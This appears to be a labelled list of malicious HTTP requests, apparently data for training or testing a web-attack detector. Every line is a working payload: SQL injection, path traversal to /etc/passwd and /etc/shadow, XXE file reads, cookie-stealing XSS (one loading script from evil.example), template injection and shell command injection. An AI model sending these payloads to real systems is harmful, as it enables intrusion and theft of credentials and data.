+XSS	/index.php?recherche=%3Ca%20aa%20aaa%20aaaa%20aaaaa%20aaaaaa%20aaaaaaa%20aaaaaaaa%20%20aaaaaaaaa%20aaaaaaaaaa%20%20href%3Dj%26%2397v%26%2397script%26%23x3A%3B%26%2397lert%281%29%3EClickMe&page=17
+SQLI	/index.php?filtre='or''='&page=17
+SQLI	/intranet/dossier?q=%27%20or%20%27%27%20%27
+MODELE	/boutique/produit?tri=${T(java.lang.Runtime).getRuntime().exec('id')}&page=9
+XSS	/api/v1/equipements?ref=%22%3E%3Cscript%20src%3D%2F%2Fevil.example%2Fx.js%3E%3C%2Fscript%3E
+SQLI	/api/v1/equipements?page=1' or 1.e(1) or '1'='1
+COMMANDE	/produits?nom="%7C%7Cecho$IFSPDWJEU$((34%2B84))$(echo$IFSPDWJEU)PDWJEU&
+TRAVERSEE	/actualites?page=%2Fvar%2Flog%2Fspooler
+XSS	/index.php?page=<script>alert(document.head.childNodes[3].text)</script>
+TRAVERSEE	/notes/releve?page=%00../../../../../../etc/shadow
+TRAVERSEE	/fichiers//usr/local/pureftpd/sbin/pure-config.pl
+SQLI	/inscription/etudiant?recherche=1\
+TRAVERSEE	/actualites?code=%2Fetc%2Fvsftpd%2Fvsftpd.conf&page=13
+COMMANDE	/intranet/dossier?ref=&&echo$IFSLWMKLS$((30%2B88))$(echo$IFSLWMKLS)LWMKLS"
+SQLI	/connexion?utilisateur=%27%20AND%20SLEEP%285%29--&motdepasse=xxxxxxxxx
+COMMANDE	/index.php?code=%253Becho%24IFSMGNUUK%24%28%2847%252B60%29%29%24%28echo%24IFSMGNUUK%29MGNUUK%2F%2F
+TRAVERSEE	/intranet/dossier?annee=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd%2500
+SQLI	/article?tri=admin') or ('1'='1'/*&page=3
+MODELE	/notes/releve?recherche=%3C%25%3D%207%2A7%20%25%3E
+SQLI	/connexion?utilisateur=%22%20or%20%22%22%26%22&motdepasse=xxxx
+SQLI	/boutique/produit?id=admin%22%20--&page=10
+TRAVERSEE	/telechargement/%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc/shadow
+COMMANDE	/boutique/produit?ref=%0aecho%20YKMXVM$((97%2B0))$(echo%20YKMXVM)YKMXVM%22
+SQLI	/login?utilisateur=%27%20or%20true--&motdepasse=xxxx
+TRAVERSEE	/documents/../../../../../../../../../../../../../etc/passwd
+TRAVERSEE	/catalogue?tri=..2f..2f..2f..2f..2f..2f..2fvar2flog2faccess.log
+COMMANDE	/actualites?page=%257Cecho%24IFSOLIGWD%24%28%2887%252B60%29%29%24%28echo%24IFSOLIGWD%29OLIGWD%252F%252F
+XSS	/recherche?q=%3Ca%20target%3D%22x%22%20href%3D%22xssme%3Fxss%3D%3Cscript%3Evar%20cl%3DComponents%3Bvar%20fcc%3DString.fromCharCode%3Bdoc%3Dcl.lookupMethod%28top%2C%20fcc%28100%2C111%2C99%2C117%2C109%2C101%2C110%2C116%29%20%29%28%20%29%3Bcl.lookupMethod%28doc%2Cfcc%28119%2C114%2C105%2C116%2C101%29%29%28doc.location.hash%29%3C%2Fscript%3E%23%3Ciframe%20src%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%252b%20name%3DZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9IC&page=3
+SQLI	/connexion?utilisateur=admin%22%2F%2A&motdepasse=xxxx
+COMMANDE	/boutique/produit?recherche=echo%2520DGPFLA%24%28%2883%252B1%29%29%24%28echo%2520DGPFLA%29DGPFLA%2527&page=13
+COMMANDE	/notes/releve?page=');}print(`echo%20VBLUSZ%0aecho%20$((96%2B95))%0aecho%20VBLUSZ%0aecho%20VBLUSZ`)%3B//VBLUSZ
+XSS	/actualites?id=%3Ca%20target%3D%22x%22%20href%3D%22xssme%3Fxss%3D%253Cscript%253EaddEventListener%2528%2522DOMFrameContentLoaded%2522%2C%2520function%2528e%2529%2520%7Be.stopPropagation%2528%2529%3B%7D%2C%2520true%2529%3B%253C%2Fscript%253E%253Ciframe%2520src%3D%2522data%3Atext%2Fhtml%2C%25253cscript%25253eObject.defineProperty%2528top%2C%2520%2527MyEvent%2527%2C%2520%7Bvalue%3A%2520Object%2C%2520configurable%3A%2520true%7D%2529%3Bfunction%2520y%2528%2529%2520%7Balert%2528top.Safe.get%2528%2529%2529%3B%7D%3Bevent%2520%3D%2520new%2520Object%2528%2529%3Bevent.type%25&page=10
+COMMANDE	/bibliotheque/ouvrage?tri=%7Cecho%20DRBQLH$((57%2B13))$(echo%20DRBQLH)DRBQLH//&page=18
+SQLI	/admin/login?utilisateur=%22%20or%20%22x%22%3D%22x&motdepasse=xxxxxxxx
+TRAVERSEE	/bibliotheque/ouvrage?page=../../../../../../../../../../../etc/passwd&page=15
+TRAVERSEE	/fichiers//etc/hostname.ecn1
+MODELE	/api/v1/equipements?id=42%2A42
+SQLI	/login?utilisateur=admin%27%29%20or%20%271%27%3D%271%27%23&motdepasse=xxxxxxxx
+TRAVERSEE	/bibliotheque/ouvrage?tri=%2Fadmin%2Finstall.php
+COMMANDE	/intranet/dossier?recherche=%2527%3B%20str%3D%24%28echo%20ZAHUZD%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2526
+XSS	/catalogue?nom=%3Ca%20href%3D%22jAvAsCrIpT%26colon%3Balert%26lpar%3B1%26rpar%3B%22%3EX%3C%2Fa%3E&page=3
+XSS	/api/v1/equipements?filtre=<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
+XSS	/api/v1/equipements?annee=%3Cscript%3E~%27%5Cu0061%27%20%3B%20%20%5Cu0074%5Cu0068%5Cu0072%5Cu006F%5Cu0077%20~%20%5Cu0074%5Cu0068%5Cu0069%5Cu0073.%20%20%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28~%27%5Cu0061%27%29%3C%2Fscript%20U%2B
+XXE	/boutique/produit?id=%3Cxsl%3Astylesheet%20version%3D%221.0%22%20xmlns%3Axsl%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2FXSL%2FTransform%22%20xmlns%3Aphp%3D%22http%3A%2F%2Fphp.net%2Fxsl%22%3E%3Cxsl%3Atemplate%20match%3D%22%2F%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E%3C%2Fxsl%3Atemplate%3E%3C%2Fxsl%3Astylesheet%3E
+COMMANDE	/bibliotheque/ouvrage?code=%3Becho%24IFSKNVVGI%24%28%2869%252B44%29%29%24%28echo%24IFSKNVVGI%29KNVVGI%2526
+SQLI	/catalogue?ref=1%60
+TRAVERSEE	/bibliotheque/ouvrage?q=/var/log/news/news.notice&page=8
+COMMANDE	/produits?id=%252527%250A%2520str%253D%2524%2528echo%2520KARBCX%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25202%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520%25255C%25255C&page=17
+TRAVERSEE	/article?page=..%252F..%252F..%252F%252F..%252F..%252F%252Fvar%252Fnamed&page=20
+XSS	/catalogue?nom=%3C--%60%3Cimg%2Fsrc%3D%60%20onerror%3Dalert%281%29%3E%20--%21%3E
+COMMANDE	/inscription/etudiant?recherche=;echo%20KTOGAF$((50%2B40))$(echo%20KTOGAF)KTOGAF&&page=16
+COMMANDE	/catalogue?annee=%2526echo%24IFSIAHRZI%24%28%2877%252B68%29%29%24%28echo%24IFSIAHRZI%29IAHRZI%22
+MODELE	/index.php?tri={{=42*42}}
+XXE	/api/v1/equipements?code=<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
+TRAVERSEE	/documents//usr/local/httpd/conf/httpd.conf
+TRAVERSEE	/telechargement/../../../etc/passwd
+XSS	/index.php?nom=%3Cscript%3E%20var%2BxmlHttp%2B%3D%2Bnull%3B%20try%2B%7B%20xmlHttp%2B%3D%2Bnew%2BXMLHttpRequest%28%29%3B%20%7D%2Bcatch%28e%29%2B%7B%7D%20if%2B%28xmlHttp%29%2B%7B%20xmlHttp.open%28%27GET%27%2C%2B%27%2Fxssme2%27%2C%2Btrue%29%3B%20xmlHttp.onreadystatechange%2B%3D%2Bfunction%2B%28%29%2B%7B%20if%2B%28xmlHttp.readyState%2B%3D%3D%2B4%29%2B%7B%20xmlHttp.responseText.match%28%2Fdocument.cookie%255Cs%252B%3D%255Cs%252B%27%28.%2A%29%27%2Fgi%29%3B%20alert%28RegExp.%25241%29%3B%20%7D%20%7D%20xmlHttp.send%28null%29%3B%20%7D%3B%20%3C%2Fscript%3E%23
+COMMANDE	/catalogue?filtre=%2520echo%2520YNTIWO%24%28%283%252B12%29%29%24%28echo%2520YNTIWO%29YNTIWO
+COMMANDE	/catalogue?recherche=echo$IFSPNBSWR$((27%2B39))$(echo$IFSPNBSWR)PNBSWR%26
+XSS	/boutique/produit?recherche=%3Cscript%3EObject.defineProperties%28window%2C%20%7BSafe%3A%20%7Bvalue%3A%20%7Bget%3A%20function%28%29%20%7Breturn%20document.cookie%7D%7D%7D%7D%29%3Balert%28Safe.get%28%29%29%3C%2Fscript%3E&page=13
+COMMANDE	/intranet/dossier?filtre=%3B%20str%3D%24%28echo%20ETAHJN%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%5C%5C
+XSS	/produits?q=%3Csvg%3E%3Cscript%3E%2F%2F%26NewLine%3Bconfirm%281%29%3B%3C%2Fscript%20%3C%2Fsvg%3E
+XXE	/bibliotheque/ouvrage?code=<?xml version="1.0" encoding="ISO-8859-1"?><test></test>
+COMMANDE	/recherche?annee=%26%20sleep%200%20%26%26%20str%3D%24%28echo%20LBFVNS%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%206%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%23
+TRAVERSEE	/fichiers//etc/httpd.conf
+TRAVERSEE	/recherche?tri=/usr/apache/conf/httpd.conf
+COMMANDE	/inscription/etudiant?q=%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520SZMRAM%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25209%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%255C%255C&page=20
+MODELE	/notes/releve?tri=<%= 7*7 %>&page=4
+SQLI	/boutique/produit?filtre=%27or%27%27%3D%27
+SQLI	/notes/releve?filtre=%22%26%22
+XXE	/article?page=<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>&page=14
+TRAVERSEE	/article?id=/etc/pure-ftpd.conf
+XXE	/boutique/produit?page=%3C%21DOCTYPE%20foo%20%5B%3C%21ELEMENT%20foo%20ANY%3E%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2F%2Fdev%2Frandom%22%3E%5D%3E
+TRAVERSEE	/bibliotheque/ouvrage?id=%2Fopt%2Flampp%2Flogs%2Faccess_log&page=14
+TRAVERSEE	/api/v1/equipements?recherche=..\..\..\..\..\..\..\..\windows\win.ini
+COMMANDE	/boutique/produit?q=%250A%2520str%253D%2524%2528echo%2520KQPSND%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25208%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520%252522&page=15
+SQLI	/boutique/produit?recherche=admin') or ('1'='1'--
+SQLI	/produits?id=1
+COMMANDE	/actualites?tri=%26%20sleep%200%20%26%26%20str%3D%24%28echo%20FAPCEG%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%257C
+SQLI	/actualites?ref=%27%20or%20%27%27%5E%27&page=7
+TRAVERSEE	/fichiers/admin/access_log
+SQLI	/inscription/etudiant?recherche=admin" or "1"="1
+XXE	/boutique/produit?code=%3C%21ENTITY%20%25%20xxe%20SYSTEM%20%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fetc%2Fpasswd%22%20%3E
+COMMANDE	/produits?ref=%2522%257C%2520%255B%25202%2520-ne%2520%2524%2528echo%2520BLTNIK%2520%257C%2520tr%2520-d%2520%2527%255Cn%2527%2520%257C%2520wc%2520-c%2529%2520%255D%2520%257C%257C%2520sleep%25201%2520%252522
+MODELE	/bibliotheque/ouvrage?annee=%24%7B42%2A42%7D
+SQLI	/espace/connexion?utilisateur=admin%22%20--&motdepasse=xxxxxxxxx
+TRAVERSEE	/actualites?q=%2Fetc%2Fhostname.spwr0
+TRAVERSEE	/fichiers//apache/logs/access_log
+TRAVERSEE	/recherche?filtre=..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+TRAVERSEE	/telechargement/..%252F..%252F..%252F%252F..%252F..%252Fetc/shadow
+SQLI	/notes/releve?code=%27%29%29%20or%20%28%28%27x%27%29%29%3D%28%28%27x&page=20
+COMMANDE	/intranet/dossier?recherche=%2522%250A%2520str%253D%2524%2528echo%2520LOCFPZ%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25209%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520%2F%2F&page=6
+TRAVERSEE	/intranet/dossier?annee=/../../../../pswd
+TRAVERSEE	/intranet/dossier?annee=/var/log/error_log
+SQLI	/bibliotheque/ouvrage?id=' UNION SELECT username,password FROM utilisateurs--
+SQLI	/api/v1/equipements?q=" or ""-"
+SQLI	/login?utilisateur=admin%22%29%20or%20%221%22%3D%221%22--&motdepasse=xxxxxx
+XSS	/notes/releve?page=<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>&page=2
+SQLI	/bibliotheque/ouvrage?tri=%22%29%20or%20true--&page=5
+TRAVERSEE	/documents//var/log/mysql/mysql.log
+COMMANDE	/notes/releve?tri=%257C%2520%255B%25206%2520-ne%2520%2524%2528echo%2520VAZLJC%2520%257C%2520tr%2520-d%2520%2527%255Cn%2527%2520%257C%2520wc%2520-c%2529%2520%255D%2520%257C%257C%2520sleep%25201%2520%25252F%25252F&page=13
+TRAVERSEE	/boutique/produit?code=/var/apache/logs/error_log
+COMMANDE	/boutique/produit?code=%2522%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520ZSTLVQ%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25206%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%2526
+SQLI	/catalogue?nom=admin%27%20--&page=17
+SQLI	/admin/login?utilisateur=admin%27%29%20or%20%28%271%27%3D%271%27%23&motdepasse=xxxxxxxxx
+SQLI	/connexion?utilisateur=admin%22or%201%3D1%20or%20%22%22%3D%22&motdepasse=xxxx
+TRAVERSEE	/intranet/dossier?code=%2Fvar%2Flog%2Flighttpd&page=18
+TRAVERSEE	/documents//var/adm/wtmpx
+TRAVERSEE	/api/v1/equipements?code=%2Fetc%2Fpostfix%2Fmydomains
+TRAVERSEE	/index.php?q=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhosts
+COMMANDE	/notes/releve?code=%26%20sleep%200%20%26%26%20str%3D%24%28echo%20LBFVNS%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%23&page=11
+TRAVERSEE	/api/v1/equipements?tri=..2f..2f..2fapache2flogs2ferror.log&page=18
+TRAVERSEE	/documents/..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22ferror_log
+XSS	/intranet/dossier?code=%3Cdiv%20onmouseover%3D%27alert%26lpar%3B1%26rpar%3B%27%3EDIV%3C%2Fdiv%3E
+TRAVERSEE	/documents/....%5C/....%5C/etc/passwd
+SQLI	/article?recherche=%27%20or%20%27%27-%27
+XSS	/notes/releve?nom=%3Cscript%3Exhr%3Dnew%20ActiveXObject%28%2522Msxml2.XMLHTTP%2522%29%3Bxhr.open%28%2522GET%2522%2C%2522%2Fxssme2%2522%2Ctrue%29%3Bxhr.onreadystatechange%3Dfunction%28%29%7Bif%28xhr.readyState%3D%3D4%2526%2526xhr.status%3D%3D200%29%7Balert%28xhr.responseText.match%28%2F%27%28%5B%5E%27%5D%252b%29%2F%29%5B1%5D%29%7D%7D%3Bxhr.send%28%29%3B%3C%2Fscript%3E
+SQLI	/notes/releve?annee="-"&page=14
+XXE	/recherche?filtre=%3Cxml%20ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG%20SRC%3D%22javas%5D%5D%3E%3C%21%5BCDATA%5Bcript%3Aalert%28%27XSS%27%29%3B%22%3E%5D%5D%3E
+COMMANDE	/api/v1/equipements?code=%2527%257C%2520%255B%25204%2520-ne%2520%2524%2528echo%2520IDQLWW%2520%257C%2520tr%2520-d%2520%2527%255Cn%2527%2520%257C%2520wc%2520-c%2529%2520%255D%2520%257C%257C%2520sleep%25201%2520%25252F%25252F
+SQLI	/inscription/etudiant?page=admin%22%29%20or%20%28%221%22%3D%221%22%2F%2A
+SQLI	/notes/releve?id=admin%27%20--
+COMMANDE	/api/v1/equipements?nom=%253Becho%24IFSXCIDGL%24%28%2884%252B77%29%29%24%28echo%24IFSXCIDGL%29XCIDGL%255C%255C
+SQLI	/recherche?recherche=admin"or 1=1 or ""="
+COMMANDE	/inscription/etudiant?ref=%7C%20%5B%209%20-ne%20%24%28echo%20GJJXKM%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20//&page=4
+COMMANDE	/api/v1/equipements?annee=%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520VDSMTK%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25205%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%252527&page=15
+SQLI	/bibliotheque/ouvrage?tri=' or ''-'
+SQLI	/bibliotheque/ouvrage?ref=1%3B%20DROP%20TABLE%20etudiants--&page=9
+TRAVERSEE	/telechargement/../../../../../../../../../../../../../../../../../../etc/passwd%00
+XSS	/intranet/dossier?page=%3Cscript%3E%20%20%28function%20%28o%29%20%7B%20%20%20function%20exploit%28x%29%20%7B%20%20%20%20if%20%28x%20%21%3D%3D%20null%29%20%20%20%20%20alert%28%27User%20cookie%20is%20%27%20%252B%20x%29%3B%20%20%20%20else%20%20%20%20%20console.log%28%27fail%27%29%3B%20%20%20%7D%20%20%20%20%20%20o.onclick%20%3D%20function%20%28e%29%20%7B%20%20%20%20e.__defineGetter__%28%27isTrusted%27%2C%20function%20%28%29%20%7B%20return%20true%3B%20%7D%29%3B%20%20%20%20exploit%28Safe.get%28%29%29%3B%20%20%20%7D%3B%20%20%20%20%20%20var%20e%20%3D%20document.createEvent%28%27MouseEvent%27%29%3B%20%20%20e.initEvent%28%27click%27%2C%20true%2C%20true%29%3B%20%20%20o.dispatchEvent%28e%29%3B%20%20%7D%29%28document.getElementB&page=8
+SQLI	/notes/releve?q=admin%27%29%20or%20%271%27%3D%271%27--
+TRAVERSEE	/static/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+XSS	/api/v1/equipements?filtre=<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">?
+TRAVERSEE	/fichiers/config.inc.php
+TRAVERSEE	/api/v1/equipements?recherche=%2Fetc%2Fmotd
+XXE	/produits?filtre=%3C%21%5BCDATA%5B%3C%5D%5D%3ESCRIPT%3C%21%5BCDATA%5B%3E%5D%5D%3Ealert%28%27XSS%27%29%3B%3C%21%5BCDATA%5B%3C%5D%5D%3E%2FSCRIPT%3C%21%5BCDATA%5B%3E%5D%5D%3E
+TRAVERSEE	/documents/....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+XSS	/notes/releve?id=%3Ca%20target%3D%22x%22%20href%3D%22xssme%3Fxss%3D%3Cscript%3Efunction%20x%28window%29%20%7B%20eval%28location.hash.substr%281%29%29%20%7D%3C%2Fscript%3E%3Ciframe%20src%3D%2522javascript%3Aparent.x%28window%29%3B%2522%3E%3C%2Fiframe%3E%23var%20xhr%20%3D%20new%20window.XMLHttpRequest%28%29%3Bxhr.open%28%27GET%27%2C%20%27.%27%2C%20true%29%3Bxhr.onload%20%3D%20function%28%29%20%7B%20alert%28xhr.responseText.match%28%2Fcookie%20%3D%20%27%28.%2A%3F%29%27%2F%29%5B1%5D%29%20%7D%3Bxhr.send%28%29%3B
+SQLI	/actualites?code=1 or 1=1
+SQLI	/espace/connexion?utilisateur=admin%27%20or%201%3D1%2F%2A&motdepasse=xxxxx
+TRAVERSEE	/fichiers//var/adm/lp/lpd-errs
+TRAVERSEE	/static//etc/php4.4/fcgi/php.ini
+XXE	/produits?code=<![CDATA[<test></test>]]>
+TRAVERSEE	/.htpasswd
+XSS	/index.php?nom=%3Cimg%20src%3Dhttp%3A%2F%2Fwww.google.fr%2Fimages%2Fsrpr%2Flogo3w.png%20onload%3Dalert%28this.ownerDocument.cookie%29%20width%3D0%20height%3D%200%20%2F%3E%20%23&page=19
+SQLI	/bibliotheque/ouvrage?annee=') or true--&page=8
+TRAVERSEE	//etc/php/apache2/php.ini
+SQLI	/api/v1/equipements?id=admin") or "1"="1"/*
+MODELE	/article?tri=${7*7}&page=1
+COMMANDE	/recherche?q=%7C%20%5B%205%20-ne%20%24%28echo%20PENGWJ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2526&page=16
+SQLI	/bibliotheque/ouvrage?filtre='&'
+TRAVERSEE	/catalogue?recherche=%2Fopt%2Fapache%2Fconf%2Fhttpd.conf
+COMMANDE	/api/v1/equipements?nom=%2526%2526echo%2520KJZRGW%24%28%286%252B53%29%29%24%28echo%2520KJZRGW%29KJZRGW%2527
+MODELE	/index.php?q=42*42
+TRAVERSEE	/telechargement/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd
+XXE	/intranet/dossier?ref=<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+XSS	/bibliotheque/ouvrage?tri=%22%3E%3Ciframe%2520src%3D%22http%3A%2F%2Fgoogle.com%22%25%25203E&page=19
+SQLI	/recherche?nom=admin" or 1=1/*
+COMMANDE	/index.php?ref=%24%7Bproc_open%28print%28%60echo%2520CPKMZS%60.%60echo%2520%24%28%2871%252B91%29%29%60.%60echo%2520CPKMZS%60.%60echo%2520CPKMZS%60%29%253B.%2527CPKMZS
+TRAVERSEE	/documents//proc/self/environ
+COMMANDE	/article?q=%27%2526%2526echo%24IFSZZSVXZ%24%28%2846%252B81%29%29%24%28echo%24IFSZZSVXZ%29ZZSVXZ%257C
+SQLI	/recherche?annee=" or "" "
+COMMANDE	/notes/releve?filtre=%2522%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520ZSTLVQ%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25207%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%2526
+SQLI	/login?utilisateur=1%22&motdepasse=xxxxxxxxx
+SQLI	/actualites?annee=1"&page=10
+MODELE	/index.php?id=#{session}
+TRAVERSEE	/telechargement//var/log
+TRAVERSEE	/notes/releve?id=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA%3D%3D&page=16
+XSS	/inscription/etudiant?ref=<script>alert(document.head.innerHTML.substr(146,20));</script>
+COMMANDE	/intranet/dossier?page=%22%3B%20str%3D%24%28echo%20GJNRXW%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522
+MODELE	/intranet/dossier?annee=%7B%5Exyzm42%7D1764%7B%2Fxyzm42%7D
+SQLI	/bibliotheque/ouvrage?annee=1 OR '1'='1
+SQLI	/intranet/dossier?annee=admin") or "1"="1"--
+COMMANDE	/produits?recherche=%253B%2520str%253D%2524%2528echo%2520UOMPHD%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25208%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%25255C%25255C
+SQLI	/intranet/dossier?id=admin%22%29%20or%20%221%22%3D%221%22%23
+COMMANDE	/actualites?code=%2527%250A%2520str%253D%2524%2528echo%2520JQNEXE%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25204%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520&page=20
+COMMANDE	/boutique/produit?recherche=%2526%2526echo%24IFSHRVANY%24%28%2838%252B49%29%29%24%28echo%24IFSHRVANY%29HRVANY%27&page=14
+TRAVERSEE	/telechargement//var/adm/qacct
+SQLI	/catalogue?tri=1 UNION SELECT table_name FROM information_schema.tables&page=14
+TRAVERSEE	/intranet/dossier?tri=..%2F..%2Fapache%2Flogs%2Faccess.log
+TRAVERSEE	/inscription/etudiant?q=/Volumes/Macintosh_HD1/usr/local/php/lib/php.ini
+TRAVERSEE	/index.php?annee=%2Fopt%2Fxampp%2Fetc%2Fphp.ini&page=16
+SQLI	/connexion?utilisateur=admin%27%20or%20%271%27%3D%271%27%2F%2A&motdepasse=xxxx
+COMMANDE	/actualites?tri=%27.print%28%60echo%2520IYCMIH%5Cnecho%2520%24%28%2835%252B93%29%29%5Cnecho%2520IYCMIH%5Cnecho%2520IYCMIH%60%29%253B%2525252523IYCMIH
+TRAVERSEE	/telechargement//PHP\php.ini
+TRAVERSEE	/boutique/produit?recherche=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500&page=13
+SQLI	/catalogue?ref=' or ''='
+COMMANDE	/index.php?tri=%24%28id%29&page=7
+XSS	/catalogue?id=<script>+-+-1-+-+alert(1)</script>
+COMMANDE	/intranet/dossier?ref=%2522%3B%20str%3D%24%28echo%20IOBNNP%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%27&page=8
+TRAVERSEE	/api/v1/equipements?filtre=%2Fvar%2Flog%2Fhttpd%2Faccess.log
+SQLI	/bibliotheque/ouvrage?recherche='^'&page=12
+COMMANDE	/index.php?tri=%252527%257C%2520%255B%25204%2520-ne%2520%2524%2528echo%2520LDSBTA%2520%257C%2520tr%2520-d%2520%2527%255Cn%2527%2520%257C%2520wc%2520-c%2529%2520%255D%2520%257C%257C%2520sleep%25201%2520%2522
+TRAVERSEE	/../../../../../apache/logs/error.log
+TRAVERSEE	/documents//etc/vhcs2/proftpd/proftpd.conf
+SQLI	/recherche?page=' UNION ALL SELECT NULL,version()--
+COMMANDE	/api/v1/equipements?page=%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20JICOQS%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20
+XXE	/catalogue?page=%3CHTML%20xmlns%3Axss%3E%3C%3Fimport%20namespace%3D%22xss%22%20implementation%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.htc%22%3E%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E%3C%2FHTML%3E
+COMMANDE	/catalogue?q=%2522%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ZTQVNM%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%206%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%27
